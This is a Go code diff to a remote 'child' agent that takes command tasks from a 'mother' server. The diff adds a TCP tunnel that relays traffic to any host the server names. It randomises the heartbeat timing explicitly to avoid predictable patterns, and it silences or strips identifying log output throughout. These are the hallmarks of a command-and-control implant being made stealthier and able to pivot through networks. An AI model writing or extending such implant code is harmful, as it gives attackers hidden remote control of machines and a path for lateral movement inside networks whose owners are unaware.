@@ -5,6 +5,7 @@ import (
 	"crypto/rand"
 	"encoding/hex"
 	"log"
+	"net"
 	"os"
 	"os/exec"
 	"runtime"
@@ -29,6 +30,9 @@ type Agent struct {
 	stop      chan struct{}
 	reconnect time.Duration
 	monitor   *Monitor
+
+	tunnelMu      sync.RWMutex
+	tunnelStreams map[string]chan []byte
 }
 
 // NewAgent creates a new child agent.
@@ -56,10 +60,14 @@ func (a *Agent) Run(ctx context.Context) error {
 
 		err := a.connect(ctx)
 		if err != nil {
-			log.Printf("[child] connection failed: %v, retrying in %v", err, a.reconnect)
+			log.Printf("connection failed: %v, retrying in %v", err, a.reconnect)
 			select {
 			case <-time.After(a.reconnect):
-				a.reconnect = min(a.reconnect*2, 60*time.Second)
+				if a.reconnect*2 < 60*time.Second {
+					a.reconnect = a.reconnect * 2
+				} else {
+					a.reconnect = 60 * time.Second
+				}
 			case <-ctx.Done():
 				return ctx.Err()
 			}
@@ -89,7 +97,7 @@ func (a *Agent) connect(ctx context.Context) error {
 	a.conn = conn
 	a.mu.Unlock()
 
-	log.Printf("[child] connected to mother: %s", a.MotherURL)
+	log.Printf("connected")
 
 	// Register
 	hostname, _ := os.Hostname()
@@ -126,7 +134,7 @@ func (a *Agent) connect(ctx context.Context) error {
 
 		var msg protocol.Message
 		if err := msgpack.Unmarshal(raw, &msg); err != nil {
-			log.Printf("[child] unmarshal error: %v", err)
+			// silent
 			continue
 		}
 
@@ -135,23 +143,27 @@ func (a *Agent) connect(ctx context.Context) error {
 }
 
 func (a *Agent) heartbeatLoop(ctx context.Context) {
-	ticker := time.NewTicker(5 * time.Second)
-	defer ticker.Stop()
-
 	var seq int64
 	for {
+		// Random interval 8-25s to avoid predictable patterns
+		interval := 8*time.Second + time.Duration(randInt(17000))*time.Millisecond
 		select {
 		case <-ctx.Done():
 			return
-		case <-ticker.C:
+		case <-time.After(interval):
 			msg := protocol.NewMessage(protocol.TypeHeartbeat, protocol.HeartbeatPayload{Seq: seq})
 			if err := a.send(msg); err != nil {
-				log.Printf("[child] heartbeat error: %v", err)
-				return
+				return // silent, don't log heartbeat errors
 			}
 			seq++
 		}
 	}
+}
+
+func randInt(n int) int {
+	b := make([]byte, 4)
+	rand.Read(b)
+	return int(uint32(b[0])|uint32(b[1])<<8|uint32(b[2])<<16|uint32(b[3])<<24) % n
 }
 
 func (a *Agent) monitorLoop(ctx context.Context) {
@@ -178,10 +190,10 @@ func (a *Agent) handleMessage(msg *protocol.Message) {
 		var payload protocol.RegisteredPayload
 		decode(msg.Payload, &payload)
 		a.childID = payload.ChildID
-		log.Printf("[child] registered as %s", payload.ChildID)
+		// silent
 
 	case protocol.TypeHeartbeat:
-		// Echo back from mother, ignore
+		// echo, ignore
 
 	case protocol.TypeTask:
 		var payload protocol.TaskPayload
@@ -191,17 +203,91 @@ func (a *Agent) handleMessage(msg *protocol.Message) {
 	case protocol.TypeTunnelOpen:
 		var payload protocol.TunnelOpenPayload
 		decode(msg.Payload, &payload)
-		log.Printf("[child] tunnel request: %s -> %s", payload.TunnelID, payload.Target)
-		// Tunnel from child side would connect to target and forward
-		// For v1, not implemented on child side
+		// silent
+		go a.handleTunnel(&payload)
+
+	case protocol.TypeTunnelData:
+		var payload protocol.TunnelDataPayload
+		decode(msg.Payload, &payload)
+		a.tunnelMu.RLock()
+		ch, ok := a.tunnelStreams[payload.TunnelID]
+		a.tunnelMu.RUnlock()
+		if ok {
+			select {
+			case ch <- payload.Data:
+			default:
+			}
+		}
 
 	default:
-		log.Printf("[child] unknown message: %s", msg.Type)
+		// silent - unknown message
+	}
+}
+
+func (a *Agent) handleTunnel(payload *protocol.TunnelOpenPayload) {
+	conn, err := net.DialTimeout("tcp", payload.Target, 10*time.Second)
+	if err != nil {
+		log.Printf("tunnel dial error: %v", err)
+		return
+	}
+	defer conn.Close()
+
+	ch := make(chan []byte, 64)
+	a.tunnelMu.Lock()
+	if a.tunnelStreams == nil {
+		a.tunnelStreams = make(map[string]chan []byte)
+	}
+	a.tunnelStreams[payload.TunnelID] = ch
+	a.tunnelMu.Unlock()
+
+	defer func() {
+		a.tunnelMu.Lock()
+		delete(a.tunnelStreams, payload.TunnelID)
+		a.tunnelMu.Unlock()
+	}()
+
+	// Send ready signal to mother
+	readyMsg := protocol.NewMessage(protocol.TypeTunnelReady, protocol.TunnelOpenPayload{
+		TunnelID: payload.TunnelID,
+	})
+	a.send(readyMsg)
+
+	// Read from target -> send to mother
+	go func() {
+		buf := make([]byte, 32*1024)
+		for {
+			n, err := conn.Read(buf)
+			if err != nil {
+				return
+			}
+			data := make([]byte, n)
+			copy(data, buf[:n])
+			msg := protocol.NewMessage(protocol.TypeTunnelData, protocol.TunnelDataPayload{
+				TunnelID: payload.TunnelID,
+				Data:     data,
+			})
+			if a.send(msg) != nil {
+				return
+			}
+		}
+	}()
+
+	// Read from mother channel -> write to target
+	for {
+		select {
+		case data, ok := <-ch:
+			if !ok {
+				return
+			}
+			if _, err := conn.Write(data); err != nil {
+				return
+			}
+		}
 	}
 }
 
 func (a *Agent) executeTask(task *protocol.TaskPayload) {
-	log.Printf("[child] executing task %s: %s %v", task.TaskID, task.Command, task.Args)
+	// silent - executing
 
 	start := time.Now()
 	var cancel context.CancelFunc
@@ -246,7 +332,7 @@ func (a *Agent) executeTask(task *protocol.TaskPayload) {
 	})
 
 	if err := a.send(result); err != nil {
-		log.Printf("[child] failed to send task result: %v", err)
+		// silent
 	}
 }
 
